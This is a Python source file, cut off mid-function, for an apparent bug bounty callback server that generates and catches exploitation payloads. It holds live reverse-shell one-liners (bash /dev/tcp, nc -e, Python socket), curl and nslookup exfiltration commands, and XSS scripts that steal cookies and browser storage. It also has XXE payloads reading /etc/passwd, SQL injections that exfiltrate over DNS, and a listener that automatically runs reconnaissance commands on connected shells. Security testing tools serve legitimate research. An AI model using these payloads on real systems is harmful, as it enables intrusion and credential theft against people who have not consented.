"""
Callback Server Service for Bug Bounty Automation Platform
Handles various types of exploitation callbacks including reverse shells, blind XSS, SSRF, DNS exfiltration, etc.
"""

import asyncio
import json
import logging
import socket
import ssl
import time
import uuid
import base64
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass
from enum import Enum
from urllib.parse import urlparse, parse_qs
import secrets
import threading

import aiohttp
import dns.resolver
import dns.server
import dns.query
from aiohttp import web, WSMsgType
from aiohttp_cors import setup as cors_setup, ResourceOptions
from celery import shared_task
from sqlalchemy import Column, String, Text, DateTime, Boolean, JSON, Integer, Enum as SQLEnum
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.dialects.postgresql import UUID
from sqlalchemy.orm import Session

from backend.models import Base, Vulnerability, ScanSession, Target
from backend.core.database import get_db_session
from backend.services.notification_service import NotificationService


class CallbackType(Enum):
    HTTP_REQUEST = "http_request"
    DNS_QUERY = "dns_query"
    REVERSE_SHELL = "reverse_shell"
    BLIND_XSS = "blind_xss"
    SSRF = "ssrf"
    XXE = "xxe"
    SMTP = "smtp"
    FTP = "ftp"
    LDAP = "ldap"
    SMB = "smb"
    RCE = "rce"
    FILE_INCLUSION = "file_inclusion"


class CallbackStatus(Enum):
    PENDING = "pending"
    RECEIVED = "received"
    PROCESSED = "processed"
    EXPIRED = "expired"


@dataclass
class CallbackPayload:
    """Callback payload configuration"""
    callback_id: str
    callback_type: CallbackType
    vulnerability_id: Optional[str]
    scan_session_id: Optional[str]
    payload_content: str
    expected_callback: str
    timeout_seconds: int
    metadata: Dict[str, Any]
    created_at: datetime
    expires_at: datetime


class Callback(Base):
    """Database model for callback tracking"""
    __tablename__ = "callbacks"
    
    id = Column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    callback_id = Column(String(255), nullable=False, unique=True, index=True)
    callback_type = Column(SQLEnum(CallbackType), nullable=False)
    status = Column(SQLEnum(CallbackStatus), default=CallbackStatus.PENDING)
    
    # Associated vulnerability/scan
    vulnerability_id = Column(UUID(as_uuid=True), nullable=True)
    scan_session_id = Column(UUID(as_uuid=True), nullable=True)
    target_domain = Column(String(255), nullable=False)
    
    # Payload information
    payload_content = Column(Text, nullable=False)
    expected_callback = Column(Text, nullable=False)
    
    # Callback details
    received_at = Column(DateTime, nullable=True)
    source_ip = Column(String(45), nullable=True)
    user_agent = Column(String(500), nullable=True)
    headers = Column(JSON, default={})
    request_data = Column(Text, nullable=True)
    response_data = Column(Text, nullable=True)
    
    # Timing
    created_at = Column(DateTime, default=datetime.utcnow)
    expires_at = Column(DateTime, nullable=False)
    timeout_seconds = Column(Integer, default=300)
    
    # Additional data
    metadata = Column(JSON, default={})
    evidence = Column(JSON, default={})
    confidence_score = Column(Integer, default=0)  # 0-100


class HTTPCallbackHandler:
    """Handles HTTP-based callbacks (XSS, SSRF, XXE, etc.)"""
    
    def __init__(self, callback_service):
        self.callback_service = callback_service
        self.logger = logging.getLogger(__name__)
    
    async def handle_http_callback(self, request):
        """Handle incoming HTTP callback"""
        try:
            # Extract callback information
            path = request.path
            callback_id = self._extract_callback_id_from_path(path)
            
            if not callback_id:
                return web.Response(status=404, text="Not Found")
            
            # Get client information
            source_ip = request.headers.get('X-Forwarded-For', request.remote)
            user_agent = request.headers.get('User-Agent', '')
            headers = dict(request.headers)
            
            # Get request data
            if request.method == 'POST':
                if request.content_type == 'application/json':
                    try:
                        request_data = await request.json()
                    except:
                        request_data = await request.text()
                else:
                    request_data = await request.text()
            else:
                request_data = dict(request.query)
            
            # Process the callback
            await self.callback_service.process_callback(
                callback_id=callback_id,
                callback_type=CallbackType.HTTP_REQUEST,
                source_ip=source_ip,
                headers=headers,
                request_data=str(request_data),
                user_agent=user_agent,
                additional_data={
                    'method': request.method,
                    'path': path,
                    'query_params': dict(request.query),
                    'content_type': request.content_type
                }
            )
            
            # Return appropriate response based on callback type
            response_content = await self._generate_callback_response(callback_id, request)
            return web.Response(text=response_content, content_type='text/html')
            
        except Exception as e:
            self.logger.error(f"HTTP callback handling error: {e}")
            return web.Response(status=500, text="Internal Server Error")
    
    def _extract_callback_id_from_path(self, path: str) -> Optional[str]:
        """Extract callback ID from URL path"""
        # Support various URL patterns:
        # /callback/{callback_id}
        # /{callback_id}
        # /c/{callback_id}
        # /img/{callback_id}.png
        # /js/{callback_id}.js
        
        path_parts = path.strip('/').split('/')
        
        # Direct callback ID in path
        if len(path_parts) >= 2 and path_parts[0] in ['callback', 'c', 'cb']:
            return path_parts[1].split('.')[0]  # Remove extension if present
        
        # Callback ID as filename
        if len(path_parts) >= 2 and path_parts[0] in ['img', 'js', 'css', 'static']:
            filename = path_parts[1].split('.')[0]
            if len(filename) >= 16:  # Minimum callback ID length
                return filename
        
        # Single path component (direct callback ID)
        if len(path_parts) == 1 and len(path_parts[0]) >= 16:
            return path_parts[0].split('.')[0]
        
        return None
    
    async def _generate_callback_response(self, callback_id: str, request) -> str:
        """Generate appropriate response for callback"""
        # Get callback details to determine response type
        with get_db_session() as db:
            callback = db.query(Callback).filter(Callback.callback_id == callback_id).first()
            
            if not callback:
                return "<!-- Callback not found -->"
            
            callback_type = callback.callback_type
            
            # Generate response based on callback type
            if callback_type == CallbackType.BLIND_XSS:
                return self._generate_xss_response(callback_id, request)
            elif callback_type == CallbackType.SSRF:
                return self._generate_ssrf_response(callback_id)
            elif callback_type == CallbackType.XXE:
                return self._generate_xxe_response(callback_id)
            else:
                return f"<!-- Callback received: {callback_id} -->"
    
    def _generate_xss_response(self, callback_id: str, request) -> str:
        """Generate XSS callback response with payload collection"""
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>XSS Callback</title>
        </head>
        <body>
            <script>
                // Collect page information
                var info = {{
                    url: document.location.href,
                    domain: document.domain,
                    cookies: document.cookie,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    innerHTML: document.documentElement.innerHTML.substring(0, 1000)
                }};
                
                // Send collected data back
                fetch('/callback/{callback_id}/data', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(info)
                }});
            </script>
            <!-- XSS Callback Received -->
        </body>
        </html>
        """
    
    def _generate_ssrf_response(self, callback_id: str) -> str:
        """Generate SSRF callback response"""
        return f"""
        HTTP/1.1 200 OK
        Content-Type: text/plain
        X-Callback-ID: {callback_id}
        
        SSRF Callback Received
        Timestamp: {datetime.utcnow().isoformat()}
        """
    
    def _generate_xxe_response(self, callback_id: str) -> str:
        """Generate XXE callback response"""
        return f"""<?xml version="1.0"?>
        <!DOCTYPE root [
        <!ENTITY callback "XXE Callback Received: {callback_id}">
        ]>
        <root>&callback;</root>
        """


class DNSCallbackHandler:
    """Handles DNS-based callbacks for DNS exfiltration and blind vulnerabilities"""
    
    def __init__(self, callback_service):
        self.callback_service = callback_service
        self.logger = logging.getLogger(__name__)
        self.dns_server = None
    
    async def start_dns_server(self, domain: str, port: int = 53):
        """Start DNS server for callback handling"""
        try:
            self.domain = domain
            resolver = dns.resolver.Resolver()
            
            # Create custom DNS handler
            handler = self._create_dns_handler()
            
            # Start DNS server
            self.dns_server = await asyncio.start_server(
                self._handle_dns_request,
                '0.0.0.0',
                port
            )
            
            self.logger.info(f"DNS callback server started on port {port} for domain {domain}")
            
        except Exception as e:
            self.logger.error(f"Failed to start DNS server: {e}")
    
    def _create_dns_handler(self):
        """Create DNS request handler"""
        async def handle_dns_query(query_name: str, query_type: str, source_ip: str):
            """Handle individual DNS query"""
            try:
                # Extract callback ID from DNS query
                callback_id = self._extract_callback_id_from_dns(query_name)
                
                if callback_id:
                    await self.callback_service.process_callback(
                        callback_id=callback_id,
                        callback_type=CallbackType.DNS_QUERY,
                        source_ip=source_ip,
                        additional_data={
                            'query_name': query_name,
                            'query_type': query_type,
                            'domain': self.domain
                        }
                    )
                
            except Exception as e:
                self.logger.error(f"DNS callback processing error: {e}")
        
        return handle_dns_query
    
    def _extract_callback_id_from_dns(self, query_name: str) -> Optional[str]:
        """Extract callback ID from DNS query name"""
        # Support patterns like:
        # {callback_id}.{domain}
        # data.{callback_id}.{domain}
        # {base64_data}.{callback_id}.{domain}
        
        if not query_name.endswith(self.domain):
            return None
        
        # Remove domain suffix
        subdomain = query_name[:-len(self.domain)].rstrip('.')
        parts = subdomain.split('.')
        
        # Look for callback ID in subdomain parts
        for part in parts:
            if len(part) >= 16 and part.replace('-', '').replace('_', '').isalnum():
                return part
        
        return None
    
    async def _handle_dns_request(self, reader, writer):
        """Handle raw DNS requests"""
        try:
            data = await reader.read(512)
            if data:
                # Parse DNS query (simplified)
                # In production, use proper DNS library
                query_info = self._parse_dns_query(data)
                
                if query_info:
                    handler = self._create_dns_handler()
                    await handler(
                        query_info['name'],
                        query_info['type'],
                        writer.get_extra_info('peername')[0]
                    )
                
                # Send DNS response
                response = self._create_dns_response(data, query_info)
                writer.write(response)
                await writer.drain()
            
            writer.close()
            
        except Exception as e:
            self.logger.error(f"DNS request handling error: {e}")
    
    def _parse_dns_query(self, data: bytes) -> Optional[Dict[str, Any]]:
        """Parse DNS query (simplified implementation)"""
        try:
            # This is a simplified parser - in production use dnspython
            if len(data) < 12:
                return None
            
            # Extract query name (simplified)
            offset = 12
            labels = []
            
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    break
                if length > 63:
                    break
                
                offset += 1
                if offset + length > len(data):
                    break
                
                label = data[offset:offset + length].decode('ascii', errors='ignore')
                labels.append(label)
                offset += length
            
            query_name = '.'.join(labels)
            return {
                'name': query_name,
                'type': 'A'  # Simplified
            }
            
        except Exception as e:
            self.logger.debug(f"DNS query parsing error: {e}")
            return None
    
    def _create_dns_response(self, query_data: bytes, query_info: Optional[Dict]) -> bytes:
        """Create DNS response"""
        # Simplified DNS response - return NXDOMAIN
        if len(query_data) >= 12:
            response = bytearray(query_data)
            # Set response bit and NXDOMAIN
            response[2] |= 0x80  # QR bit
            response[3] |= 0x03  # RCODE = NXDOMAIN
            return bytes(response)
        
        return b''


class ReverseShellHandler:
    """Handles reverse shell callbacks"""
    
    def __init__(self, callback_service):
        self.callback_service = callback_service
        self.logger = logging.getLogger(__name__)
        self.shell_servers = {}
    
    async def start_shell_listener(self, port: int, callback_id: str):
        """Start reverse shell listener"""
        try:
            server = await asyncio.start_server(
                lambda r, w: self._handle_shell_connection(r, w, callback_id),
                '0.0.0.0',
                port
            )
            
            self.shell_servers[callback_id] = {
                'server': server,
                'port': port,
                'started_at': datetime.utcnow()
            }
            
            self.logger.info(f"Reverse shell listener started on port {port} for callback {callback_id}")
            return port
            
        except Exception as e:
            self.logger.error(f"Failed to start shell listener: {e}")
            return None
    
    async def _handle_shell_connection(self, reader, writer, callback_id: str):
        """Handle incoming shell connection"""
        try:
            source_ip = writer.get_extra_info('peername')[0]
            
            # Send initial command to identify shell type
            writer.write(b"id; whoami; pwd\n")
            await writer.drain()
            
            # Read initial response
            initial_data = await asyncio.wait_for(reader.read(1024), timeout=10)
            
            # Process the callback
            await self.callback_service.process_callback(
                callback_id=callback_id,
                callback_type=CallbackType.REVERSE_SHELL,
                source_ip=source_ip,
                additional_data={
                    'shell_type': 'reverse_shell',
                    'initial_response': initial_data.decode('utf-8', errors='ignore'),
                    'port': self.shell_servers[callback_id]['port']
                }
            )
            
            # Keep connection alive for a short time for further interaction
            await self._interactive_shell_session(reader, writer, callback_id, timeout=60)
            
        except Exception as e:
            self.logger.error(f"Shell connection handling error: {e}")
        finally:
            writer.close()
    
    async def _interactive_shell_session(self, reader, writer, callback_id: str, timeout: int = 60):
        """Handle interactive shell session"""
        try:
            session_log = []
            
            # Basic reconnaissance commands
            recon_commands = [
                "uname -a",
                "id",
                "pwd",
                "ls -la",
                "ps aux | head -10",
                "netstat -antlp | head -10",
                "cat /etc/passwd | head -5",
                "env | head -10"
            ]
            
            for command in recon_commands:
                try:
                    writer.write(f"{command}\n".encode())
                    await writer.drain()
                    
                    # Read response with timeout
                    response = await asyncio.wait_for(reader.read(4096), timeout=5)
                    response_text = response.decode('utf-8', errors='ignore')
                    
                    session_log.append({
                        'command': command,
                        'response': response_text,
                        'timestamp': datetime.utcnow().isoformat()
                    })
                    
                    await asyncio.sleep(1)  # Rate limiting
                    
                except asyncio.TimeoutError:
                    session_log.append({
                        'command': command,
                        'response': '[TIMEOUT]',
                        'timestamp': datetime.utcnow().isoformat()
                    })
                    continue
            
            # Update callback with session information
            with get_db_session() as db:
                callback = db.query(Callback).filter(Callback.callback_id == callback_id).first()
                if callback:
                    callback.evidence.update({
                        'shell_session': session_log,
                        'session_duration': timeout,
                        'commands_executed': len(recon_commands)
                    })
                    db.commit()
            
        except Exception as e:
            self.logger.error(f"Interactive shell session error: {e}")


class CallbackService:
    """Main callback service coordinating all callback types"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.notification_service = NotificationService()
        self.http_handler = HTTPCallbackHandler(self)
        self.dns_handler = DNSCallbackHandler(self)
        self.shell_handler = ReverseShellHandler(self)
        
        # Callback tracking
        self.active_callbacks: Dict[str, CallbackPayload] = {}
        self.callback_ports: Dict[str, int] = {}
        
        # Server configuration
        self.http_server = None
        self.dns_server = None
        self.base_domain = "callback.local"  # Configure this
        self.http_port = 8080
        self.dns_port = 53
        self.shell_port_range = (4444, 4500)
        self.next_shell_port = self.shell_port_range[0]
    
    async def start_servers(self, config: Dict[str, Any]):
        """Start all callback servers"""
        try:
            self.base_domain = config.get('base_domain', self.base_domain)
            self.http_port = config.get('http_port', self.http_port)
            self.dns_port = config.get('dns_port', self.dns_port)
            
            # Start HTTP callback server
            await self._start_http_server()
            
            # Start DNS callback server
            await self._start_dns_server()
            
            # Start cleanup task
            asyncio.create_task(self._cleanup_expired_callbacks())
            
            self.logger.info("All callback servers started successfully")
            
        except Exception as e:
            self.logger.error(f"Failed to start callback servers: {e}")
            raise
    
    async def _start_http_server(self):
        """Start HTTP callback server"""
        app = web.Application()
        
        # Add CORS support
        cors = cors_setup(app, defaults={
            "*": ResourceOptions(
                allow_credentials=True,
                expose_headers="*",
                allow_headers="*",
                allow_methods="*"
            )
        })
        
        # Routes for different callback types
        app.router.add_route('*', '/callback/{callback_id}', self.http_handler.handle_http_callback)
        app.router.add_route('*', '/callback/{callback_id}/data', self.http_handler.handle_http_callback)
        app.router.add_route('*', '/c/{callback_id}', self.http_handler.handle_http_callback)
        app.router.add_route('*', '/img/{callback_id}.{ext}', self.http_handler.handle_http_callback)
        app.router.add_route('*', '/js/{callback_id}.js', self.http_handler.handle_http_callback)
        app.router.add_route('*', '/css/{callback_id}.css', self.http_handler.handle_http_callback)
        app.router.add_route('*', '/{callback_id}', self.http_handler.handle_http_callback)
        
        # Health check endpoint
        app.router.add_get('/health', self._health_check)
        
        # WebSocket endpoint for real-time callback updates
        app.router.add_get('/ws/callbacks', self._websocket_handler)
        
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, '0.0.0.0', self.http_port)
        await site.start()
        
        self.http_server = runner
        self.logger.info(f"HTTP callback server started on port {self.http_port}")
    
    async def _start_dns_server(self):
        """Start DNS callback server"""
        try:
            await self.dns_handler.start_dns_server(self.base_domain, self.dns_port)
            self.logger.info(f"DNS callback server started on port {self.dns_port}")
        except Exception as e:
            self.logger.warning(f"DNS server failed to start: {e}")
    
    async def _health_check(self, request):
        """Health check endpoint"""
        return web.json_response({
            'status': 'healthy',
            'active_callbacks': len(self.active_callbacks),
            'servers': {
                'http': self.http_port,
                'dns': self.dns_port,
                'base_domain': self.base_domain
            },
            'timestamp': datetime.utcnow().isoformat()
        })
    
    async def _websocket_handler(self, request):
        """WebSocket handler for real-time callback updates"""
        ws = web.WebSocketResponse()
        await ws.prepare(request)
        
        try:
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    # Handle WebSocket messages if needed
                    pass
                elif msg.type == WSMsgType.ERROR:
                    self.logger.error(f'WebSocket error: {ws.exception()}')
        except Exception as e:
            self.logger.error(f"WebSocket handler error: {e}")
        
        return ws
    
    def generate_callback_id(self) -> str:
        """Generate unique callback ID"""
        return secrets.token_urlsafe(16)
    
    def generate_callback_payloads(self, vulnerability_id: str, vuln_type: str,
                                 affected_url: str, parameter: str) -> Dict[str, str]:
        """Generate callback payloads for different vulnerability types"""
        callback_id = self.generate_callback_id()
        callback_domain = f"{callback_id}.{self.base_domain}"
        callback_url = f"http://{self.base_domain}:{self.http_port}/callback/{callback_id}"
        
        payloads = {}
        
        if 'xss' in vuln_type.lower():
            payloads.update({
                'blind_xss_img': f'<img src="{callback_url}/xss.png" style="display:none">',
                'blind_xss_script': f'<script src="{callback_url}/xss.js"></script>',
                'blind_xss_fetch': f'<script>fetch("{callback_url}")</script>',
                'xss_cookie_theft': f'<script>document.location="{callback_url}?c="+document.cookie</script>'
            })
        
        if 'ssrf' in vuln_type.lower() or 'injection' in vuln_type.lower():
            payloads.update({
                'ssrf_http': callback_url,
                'ssrf_dns': callback_domain,
                'ssrf_file': f'file://{callback_url}',
                'ssrf_ftp': f'ftp://{callback_domain}:21/',
                'ssrf_ldap': f'ldap://{callback_domain}:389/'
            })
        
        if 'xxe' in vuln_type.lower():
            payloads.update({
                'xxe_http': f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{callback_url}">]><root>&xxe;</root>',
                'xxe_file': f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY callback SYSTEM "{callback_url}?data=%xxe;">]><root>&callback;</root>'
            })
        
        if 'command' in vuln_type.lower() or 'rce' in vuln_type.lower():
            shell_port = self._get_next_shell_port()
            payloads.update({
                'reverse_shell_bash': f'bash -i >& /dev/tcp/{self.base_domain}/{shell_port} 0>&1',
                'reverse_shell_nc': f'nc {self.base_domain} {shell_port} -e /bin/bash',
                'reverse_shell_python': f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{self.base_domain}\\",{shell_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);"',
                'dns_exfiltration': f'nslookup `whoami`.{callback_domain}',
                'http_exfiltration': f'curl {callback_url}?data=`id|base64`'
            })
            
            # Start shell listener for this callback
            asyncio.create_task(self.shell_handler.start_shell_listener(shell_port, callback_id))
            self.callback_ports[callback_id] = shell_port
        
        if 'sql' in vuln_type.lower():
            payloads.update({
                'sql_dns_exfil': f"'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.{callback_domain}\\\\\\\\foobar')); --",
                'sql_http_exfil': f"'; SELECT @@version INTO OUTFILE '\\\\\\\\{callback_domain}\\\\\\\\shared\\\\\\\\out.txt'; --",
                'mssql_dns': f"'; exec master..xp_dirtree '\\\\\\\\{callback_domain}\\\\\\\\foobar'; --"
            })
        
        # Store callback information
        self._register_callback(callback_id, vulnerability_id, vuln_type, payloads)
        
        return {
            'callback_id': callback_id,
            'callback_domain': callback_domain,
            'callback_url': callback_url,
            'payloads': payloads
        }
    
    def _register_callback(self, callback_id: str, vulnerability_id: str, 
                          vuln_type: str, payloads: Dict[str, str]):
        """Register callback in database and memory"""
        with get_db_session() as db:
            callback = Callback(
                callback_id=callback_id,
                callback_type=CallbackType.HTTP_REQUEST,  # Default, may be updated
                vulnerability_id=vulnerability_id,
                target_domain=self.base_domain,
                payload_content=json.dumps(payloads),
                expected_callback=f"Any callback to {callback_id}",
                expires_at=datetime.utcnow() + timedelta(hours=24),
                timeout_seconds=86400,  # 24 hours
                metadata={
                    'vulnerability_type': vuln_type,
                    'payloads_generated': list(payloads.keys())
                }
            )
            
            db.add(callback)
            db.commit()
            
            # Store in memory for quick access
            self.active_callbacks[callback_id] = CallbackPayload(
                callback_id=callback_id,
                callback_type=CallbackType.HTTP_REQUEST,
                vulnerability_id=vulnerability_id,
                scan_session_id=None,
                payload_content=json.dumps(payloads),
                expected_callback=f"Any callback to {callback_id}",
                timeout_seconds=86400,
                metadata={'vulnerability_type': vuln_type},
                created_at=datetime.utcnow(),
                expires_at=datetime.utcnow() + timedelta(hours=24)
            )
    
    async def process_callback(self, callback_id: str, callback_type: CallbackType,
                             source_ip: str, headers: Dict = None, 
                             request_data: str = None, user_agent: str = None,
                             additional_data: Dict = None):
        """Process received callback"""
        try:
            with get_db_session() as db:
                callback = db.query(Callback).filter(
                    Callback.callback_id == callback_id
                ).first()
                
                if not callback:
                    self.logger.warning(f"Received callback for unknown ID: {callback_id}")
                    return
                
                # Update callback with received data
                callback.status = CallbackStatus.RECEIVED
                callback.received_at = datetime.utcnow()
                callback.source_ip = source_ip
                callback.user_agent = user_agent or ""
                callback.headers = headers or {}
                callback.request_data = request_data
                callback.callback_type = callback_type
                
                # Calculate confidence score based on callback quality
                confidence = self._calculate_callback_confidence(
                    callback_type, headers, request_data, additional_data
                )
                callback.confidence_score = confidence
                
                # Store additional evidence
                evidence = callback.evidence or {}
                evidence.update({
                    'callback_received_at': datetime.utcnow().isoformat(),
                    'callback_type': callback_type.value,
                    'source_verification': self._verify_callback_source(source_ip, headers),
                    'data_analysis': self._analyze_callback_data(request_data, additional_data)
                })
                
                if additional_data:
                    evidence.update(additional_data)
                
                callback.evidence = evidence
                callback.status = CallbackStatus.PROCESSED
                
                db.commit()
                
                # Update vulnerability if associated
                if callback.vulnerability_id:
                    await self._update_vulnerability_with_callback(callback, db)
                
                # Send notification
                await self._send_callback_notification(callback)
                
                # Broadcast to WebSocket clients
                await self._broadcast_callback_update(callback)
                
                self.logger.info(f"Processed callback {callback_id} from {source_ip}")
                
        except Exception as e:
            self.logger.error(f"Callback processing error: {e}")
    
    def _calculate_callback_confidence(self, callback_type: CallbackType, 
                                     headers: Dict, request_data: str, 
                                     additional_data: Dict) -> int:
        """Calculate confidence score (0-100) based on callback quality"""
        confidence = 50  # Base confidence
        
        # Boost confidence based on callback type
        if callback_type == CallbackType.REVERSE_SHELL:
            confidence += 40  # High confidence for shell callbacks
        elif callback_type == CallbackType.DNS_QUERY:
            confidence += 30  # Good confidence for DNS
        elif callback_type == CallbackType.HTTP_REQUEST:
            confidence += 20  # Medium confidence for HTTP
        
        # Boost confidence based on headers
        if headers:
            if 'User-Agent' in headers and 'Mozilla' in headers['User-Agent']:
                confidence += 10  # Real browser
            if 'Referer' in headers:
                confidence += 5
            if 'Cookie' in headers:
                confidence += 10  # Authentication context
        
        # Boost confidence based on request data
        if request_data:
            if len(request_data) > 100:
                confidence += 10  # Rich data
            if any(keyword in request_data.lower() for keyword in ['cookie', 'session', 'token']):
                confidence += 15  # Sensitive data
        
        # Boost confidence based on additional data
        if additional_data:
            if additional_data.get('shell_type'):
                confidence += 20  # Shell interaction confirmed
            if additional_data.get('commands_executed', 0) > 0:
                confidence += 15  # Command execution confirmed
        
        return min(100, max(0, confidence))
    
    def _verify_callback_source(self, source_ip: str, headers: Dict) -> Dict[str, Any]:
        """Verify the authenticity of the callback source"""
        verification = {
            'source_ip': source_ip,
            'ip_type': 'unknown',
            'geolocation': None,
            'reverse_dns': None,
            'suspicious_indicators': []
        }
        
        try:
            import ipaddress
            ip = ipaddress.ip_address(source_ip)
            
            if ip.is_private:
                verification['ip_type'] = 'private'
            elif ip.is_loopback:
                verification['ip_type'] = 'loopback'
                verification['suspicious_indicators'].append('loopback_address')
            elif ip.is_multicast:
                verification['ip_type'] = 'multicast'
                verification['suspicious_indicators'].append('multicast_address')
            else:
                verification['ip_type'] = 'public'
            
            # Reverse DNS lookup
            try:
                import socket
                reverse_dns = socket.gethostbyaddr(source_ip)[0]
                verification['reverse_dns'] = reverse_dns
            except socket.herror:
                pass
            
            # Check for suspicious patterns in headers
            if headers:
                user_agent = headers.get('User-Agent', '').lower()
                if any(bot in user_agent for bot in ['bot', 'crawler', 'spider', 'scanner']):
                    verification['suspicious_indicators'].append('bot_user_agent')
                if not user_agent:
                    verification['suspicious_indicators'].append('missing_user_agent')
            
        except Exception as e:
            self.logger.debug(f"Source verification error: {e}")
        
        return verification
    
    def _analyze_callback_data(self, request_data: str, additional_data: Dict) -> Dict[str, Any]:
        """Analyze callback data for interesting patterns"""
        analysis = {
            'data_size': len(request_data) if request_data else 0,
            'contains_sensitive_data': False,
            'data_patterns': [],
            'decoded_data': {}
        }
        
        if not request_data:
            return analysis
        
        try:
            # Check for sensitive data patterns
            sensitive_patterns = [
                r'password[=:]([^\s&]+)',
                r'token[=:]([^\s&]+)',
                r'session[=:]([^\s&]+)',
                r'cookie[=:]([^\s&]+)',
                r'auth[=:]([^\s&]+)'
            ]
            
            import re
            for pattern in sensitive_patterns:
                matches = re.findall(pattern, request_data, re.IGNORECASE)
                if matches:
                    analysis['contains_sensitive_data'] = True
                    analysis['data_patterns'].append({
                        'pattern': pattern,
                        'matches_count': len(matches)
                    })
            
            # Try to decode common encodings
            try:
                # Base64 decode
                import base64
                if len(request_data) % 4 == 0:
                    decoded = base64.b64decode(request_data).decode('utf-8', errors='ignore')
                    if decoded and decoded != request_data:
                        analysis['decoded_data']['base64'] = decoded[:500]  # Limit size
            except:
                pass
            
            # URL decode
            try:
                from urllib.parse import unquote
                url_decoded = unquote(request_data)
                if url_decoded != request_data:
                    analysis['decoded_data']['url'] = url_decoded[:500]
            except:
                pass
            
            # JSON parse
            try:
                import json
                if request_data.strip().startswith('{'):
                    parsed_json = json.loads(request_data)
                    analysis['decoded_data']['json'] = parsed_json
            except:
                pass
            
        except Exception as e:
            self.logger.debug(f"Data analysis error: {e}")
        
        return analysis
    
    async def _update_vulnerability_with_callback(self, callback: Callback, db: Session):
        """Update associated vulnerability with callback information"""
        try:
            vulnerability = db.query(Vulnerability).filter(
                Vulnerability.id == callback.vulnerability_id
            ).first()
            
            if vulnerability:
                # Mark as exploitable with high confidence
                vulnerability.is_exploitable = True
                vulnerability.confidence_level = min(1.0, vulnerability.confidence_level + 0.4)
                
                # Update exploitation notes
                exploitation_notes = {}
                if vulnerability.exploitation_notes:
                    try:
                        exploitation_notes = json.loads(vulnerability.exploitation_notes)
                    except json.JSONDecodeError:
                        pass
                
                exploitation_notes.update({
                    'callback_received': True,
                    'callback_id': callback.callback_id,
                    'callback_type': callback.callback_type.value,
                    'callback_confidence': callback.confidence_score,
                    'callback_timestamp': callback.received_at.isoformat(),
                    'callback_source': callback.source_ip,
                    'exploitation_confirmed': True
                })
                
                vulnerability.exploitation_notes = json.dumps(exploitation_notes)
                
                # Add callback evidence to vulnerability
                if not vulnerability.additional_evidence:
                    vulnerability.additional_evidence = {}
                
                vulnerability.additional_evidence['callback_evidence'] = {
                    'callback_id': callback.callback_id,
                    'evidence': callback.evidence,
                    'confidence_score': callback.confidence_score
                }
                
                db.commit()
                
        except Exception as e:
            self.logger.error(f"Vulnerability update error: {e}")
    
    async def _send_callback_notification(self, callback: Callback):
        """Send notification about received callback"""
        try:
            # Determine notification priority based on callback type and confidence
            if callback.callback_type == CallbackType.REVERSE_SHELL:
                notification_type = "critical"
                title = "🚨 Reverse Shell Callback Received!"
            elif callback.confidence_score >= 80:
                notification_type = "success"
                title = f"🎯 High-Confidence {callback.callback_type.value.title()} Callback"
            else:
                notification_type = "success"
                title = f"✅ {callback.callback_type.value.title()} Callback Received"
            
            # Get target information
            target_name = "Unknown Target"
            user_id = "system"
            
            if callback.vulnerability_id:
                with get_db_session() as db:
                    vulnerability = db.query(Vulnerability).join(ScanSession).join(Target).filter(
                        Vulnerability.id == callback.vulnerability_id
                    ).first()
                    
                    if vulnerability:
                        target_name = vulnerability.scan_session.target.target_name
                        user_id = vulnerability.scan_session.target.researcher_username
            
            message = f"Callback received from {callback.source_ip} for {target_name}"
            
            await self.notification_service.create_notification(
                user_id=user_id,
                title=title,
                message=message,
                notification_type=notification_type,
                category="exploitation",
                metadata={
                    "callback_id": callback.callback_id,
                    "callback_type": callback.callback_type.value,
                    "source_ip": callback.source_ip,
                    "confidence_score": callback.confidence_score,
                    "vulnerability_id": str(callback.vulnerability_id) if callback.vulnerability_id else None,
                    "target_name": target_name
                },
                action_url=f"/callbacks/{callback.callback_id}",
                expires_in_minutes=None  # Don't auto-expire important callbacks
            )
            
        except Exception as e:
            self.logger.error(f"Callback notification error: {e}")
    
    async def _broadcast_callback_update(self, callback: Callback):
        """Broadcast callback update to WebSocket clients"""
        try:
            update_data = {
                'type': 'callback_received',
                'callback_id': callback.callback_id,
                'callback_type': callback.callback_type.value,
                'source_ip': callback.source_ip,
                'confidence_score': callback.confidence_score,
                'received_at': callback.received_at.isoformat(),
                'vulnerability_id': str(callback.vulnerability_id) if callback.vulnerability_id else None
            }
            
            # In a real implementation, you would broadcast to connected WebSocket clients
            # For now, we'll just log the update
            self.logger.info(f"Broadcasting callback update: {update_data}")
            
        except Exception as e:
            self.logger.error(f"Callback broadcast error: {e}")
    
    def _get_next_shell_port(self) -> int:
        """Get next available port for reverse shell listener"""
        port = self.next_shell_port
        self.next_shell_port += 1
        
        if self.next_shell_port > self.shell_port_range[1]:
            self.next_shell_port = self.shell_port_range[0]
        
        return port
    
    async def _cleanup_expired_callbacks(self):
        """Cleanup expired callbacks periodically"""
        while True:
            try:
                await asyncio.sleep(3600)  # Run every hour
                
                with get_db_session() as db:
                    # Mark expired callbacks
                    expired_callbacks = db.query(Callback).filter(
                        Callback.expires_at < datetime.utcnow(),
                        Callback.status != CallbackStatus.EXPIRED
                    ).all()
                    
                    for callback in expired_callbacks:
                        callback.status = CallbackStatus.EXPIRED
                        
                        # Clean up associated resources
                        if callback.callback_id in self.active_callbacks:
                            del self.active_callbacks[callback.callback_id]
                        
                        if callback.callback_id in self.callback_ports:
                            # Close shell listeners if any
                            port = self.callback_ports[callback.callback_id]
